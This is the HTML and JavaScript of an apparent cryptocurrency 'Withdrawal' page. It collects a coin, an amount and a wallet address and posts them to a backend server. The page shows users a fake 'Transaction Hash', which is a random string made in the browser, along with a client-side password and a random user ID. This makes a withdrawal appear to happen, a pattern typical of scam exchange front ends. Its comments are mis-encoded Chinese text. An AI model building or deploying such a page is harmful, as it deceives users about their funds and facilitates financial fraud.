<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Withdrawal</title>
<style>
  /* ÂéüÊ†∑ UI Ê†∑ÂºèÔºåÊú™ÊîπÂä® */
  * { box-sizing: border-box; }
  body { background-color: transparent; font-family: Arial, sans-serif; margin: 0; padding: 0; width: 100%; overflow-x: hidden; }
  .withdraw-box { width: 100%; max-width: 450px; margin: 30px auto; padding: 25px; border-radius: 12px; background: transparent !important; color: white; }
  select, input, button { width: 100%; max-width: 100%; padding: 12px; margin-top: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.6); background: transparent !important; color: white; font-size: 15px; display: block; }
  select option { color: black; }
  button { cursor: pointer; font-weight: bold; border: none; background: #0099cc; }
  button:disabled { background: #444; }
  .row { display: flex; justify-content: space-between; gap: 10px; width: 100%; }
  #copyHashBtn, #submitBtn { display: none; width: 48%; }
  #usdtText { text-align: right; color: #00ff00; font-size: 13px; }
  #hashBox { color: #00ff00; margin-top: 10px; white-space: pre-line; font-size: 14px; overflow-wrap: break-word; }
</style>
</head>
<body>
  <div class="withdraw-box">
    <h2 style="text-align:center;"></h2>
    <label>Select Cryptocurrency</label>
    <select id="coin" onchange="updateUSDT()">
      <!-- same options -->
      <option value="BTC">BTC</option><option value="ETH">ETH</option><option value="USDT">USDT</option><option value="BNB">BNB</option><option value="XRP">XRP</option><option value="ADA">ADA</option><option value="SOL">SOL</option><option value="DOGE">DOGE</option><option value="TRX">TRX</option><option value="DOT">DOT</option><option value="MATIC">MATIC</option><option value="LTC">LTC</option><option value="AVAX">AVAX</option><option value="UNI">UNI</option><option value="ETC">ETC</option><option value="ATOM">ATOM</option><option value="XMR">XMR</option><option value="FIL">FIL</option><option value="APT">APT</option><option value="ARB">ARB</option>
    </select>

    <label>Enter Coin Amount</label>
    <input id="amount" placeholder="Enter amount" oninput="updateUSDT()" />
    <div id="usdtText">USDT Equivalent: <span id="usdtValue">0</span></div>

    <label>Password</label>
    <input type="password" id="password" placeholder="Enter password" />
    <div class="row">
      <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
      <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
    </div>
    <button onclick="forgotPassword()">Forgot Password?</button>
    <label>Wallet Address</label>
    <input id="wallet" placeholder="Paste wallet address" />
    <button id="walletBtn" onclick="confirmWallet()">Confirm Wallet Address</button>
    <div id="hashBox"></div>
    <div class="row">
      <button id="copyHashBtn" onclick="copyHash()">Copy Hash</button>
      <button id="submitBtn" onclick="submitWithdrawal()">Submit Withdrawal</button>
    </div>
  </div>

<script>
/* ---------- ÂÖºÂÆπ‰∏éÂÆπÈîô‰øÆÂ§çÔºà‰∏çÊîπ UIÔºâ ---------- */
const API_BASE = "https://crypto-management-production-5e04.up.railway.app";

/* Â∞ÅË£ÖÔºöÂÖàÂ∞ùËØï /proxy/withdrawÔºåÂÜçÂõûÈÄÄ /api/order/withdraw */
async function postWithFallback(urls, options={}, retries=1, delay=500){
  for (let i=0;i<urls.length;i++){
    const u = urls[i];
    try{
      for (let r=0;r<=retries;r++){
        try{
          const res = await fetch(u, options);
          if(res.status === 404) throw {code:404};
          return res;
        }catch(e){
          if(r===retries) throw e;
          await new Promise(s=>setTimeout(s, delay));
        }
      }
    }catch(e){
      if(i === urls.length - 1) throw e;
    }
  }
  throw new Error('No url available');
}

function formatUsTime(ts){
  const d = ts ? new Date(Number(ts)) : new Date();
  const s = d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true });
  return s.replace(',', '');
}

function getUserId(){
  try{
    const url = new URLSearchParams(window.location.search);
    let uid = url.get("userid") || localStorage.getItem("userid4");
    if(!uid){ uid = Math.floor(1000+Math.random()*9000).toString(); localStorage.setItem("userid4", uid); }
    // ÂêåÊ≠•ÔºàÈùûÈòªÂ°ûÔºâ
    (async ()=>{ try{ await fetch(`${API_BASE}/api/users/sync`, { method:'POST', headers:{'Content-Type':'application/json','X-User-Id':uid}, body: JSON.stringify({ userid: uid }) }); }catch(e){} })();
    return uid;
  }catch(e){ return '0000'; }
}
const USERID = getUserId();

/* Binance websocket - ‰ΩøÁî® !ticker@arr Á®çÂç†ËµÑÊ∫êÔºåÊîπ‰∏∫ÈÄâÊã©Â∏ÅÁßçËøûÊé•‰ª•Á®≥ÂÆö Strikingly */
const prices = {};
let ws = null;
function initTicker(){
  try{
    ws = new WebSocket("wss://stream.binance.com:9443/ws/!ticker@arr");
    ws.onmessage = msg => { try{ const data = JSON.parse(msg.data); data.forEach(t => { if(t.s.endsWith("USDT")) prices[t.s.replace("USDT",'')] = parseFloat(t.c); }); updateUSDT(); }catch(e){} };
    ws.onclose = ()=> setTimeout(()=> initTicker(), 2000);
  }catch(e){}
}
initTicker();

function updateUSDT(){
  try{
    const coin = document.getElementById("coin").value;
    const amount = parseFloat(document.getElementById("amount").value || 0);
    const price = prices[coin] || 0;
    document.getElementById("usdtValue").innerText = (amount * price).toFixed(6);
  }catch(e){}
}

/* ÂØÜÁ†ÅÁ≥ªÁªüÔºà‰øùÊåÅ‰Ω†ÁöÑÈÄªËæëÔºâ */
let storedPassword = localStorage.getItem("withdraw_password");
let passwordConfirmed = false;
window.onload = () => { if (storedPassword) document.getElementById("createPwdBtn").style.display = "none"; };
function createPassword(){ if(storedPassword) return alert("Password already created."); storedPassword = Math.random().toString(36).substr(2,6).toUpperCase(); localStorage.setItem("withdraw_password", storedPassword); alert("Your Password: "+storedPassword+"\n\nü§ñ Please change your withdrawal password immediately."); document.getElementById("createPwdBtn").style.display = "none"; }
function confirmPassword(){ const input = document.getElementById("password").value; if(input === storedPassword){ passwordConfirmed = true; alert("Password confirmed!"); } else alert("Wrong password!"); }
function forgotPassword(){ if(!storedPassword) return alert("Password not created."); const oldp = prompt("Enter current password:"); if(oldp !== storedPassword) return alert("Wrong password."); const newp = prompt("Enter new password (min 4 chars):"); if(!newp || newp.length<4) return alert("Too short."); storedPassword = newp; localStorage.setItem("withdraw_password", newp); alert("Password updated!"); }

/* WALLET + HASHÔºà‰øùÊåÅ UIÔºâ */
let txHash = null;
function confirmWallet(){ if(!passwordConfirmed) return alert("Confirm password first."); const wallet = document.getElementById("wallet").value; if(!wallet) return alert("Enter wallet address."); txHash = "TX-" + Math.random().toString(36).substr(2,8).toUpperCase(); document.getElementById("hashBox").innerText = "Transaction Hash:\n" + txHash; document.getElementById("copyHashBtn").style.display = "block"; document.getElementById("submitBtn").style.display = "block"; document.getElementById("walletBtn").disabled = true; }
function copyHash(){ navigator.clipboard.writeText(txHash); alert("Hash copied!"); }

/* SUBMIT Âà∞ÂêéÂè∞Ôºà‰ºòÂÖà /proxy/withdraw ÂõûÈÄÄ /api/order/withdrawÔºâ */
async function submitWithdrawal(){
  try{
    const coin = document.getElementById("coin").value;
    const amount = document.getElementById("amount").value;
    const usdt = document.getElementById("usdtValue").innerText;
    const wallet = document.getElementById("wallet").value;
    if(!passwordConfirmed) return alert("Confirm password first.");
    if(!wallet) return alert("Enter wallet address.");
    const orderId = `WDL-${new Date().toISOString().slice(0,10).replace(/-/g,'')}-${Math.floor(100000 + Math.random()*900000)}`;
    const usTime = formatUsTime(Date.now());
    const payload = { userid: USERID, coin, amount, wallet, usdt, hash: txHash, orderId, timestamp: Date.now(), time_us: usTime };
    // button ui
    const submitBtnEl = document.getElementById("submitBtn");
    submitBtnEl.disabled = true; submitBtnEl.style.opacity = "0.7"; submitBtnEl.textContent = "Submitting...";
    // post with fallback
    const urls = [ `${API_BASE}/proxy/withdraw`, `${API_BASE}/api/order/withdraw` ];
    const res = await postWithFallback(urls, { method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': USERID }, body: JSON.stringify(payload) }, 1, 500);
    const data = await res.json();
    if(data && (data.ok === true || data.success === true)){
      alert("Withdrawal submitted!");
      document.getElementById("hashBox").innerText += `\n\nOrder ID: ${orderId}\nTime (US): ${usTime}`;
    } else {
      alert("Server error: " + (data && (data.message||data.error) || 'unknown'));
      submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
    }
  }catch(e){
    console.error('submitWithdrawal error', e);
    alert("Network error: Êèê‰∫§Â§±Ë¥•ÔºåËØ∑Á®çÂêéÂú®ÂêéÂè∞Á°ÆËÆ§ÊàñÈáçËØï„ÄÇ");
    const submitBtnEl = document.getElementById("submitBtn");
    submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
  }
}
</script>

<!-- ‰øùÁïô auth ‰∏é nexbit -->
<script src="js/auth.js"></script>
<script src="js/nexbit-api.js"></script>
</body>
</html>
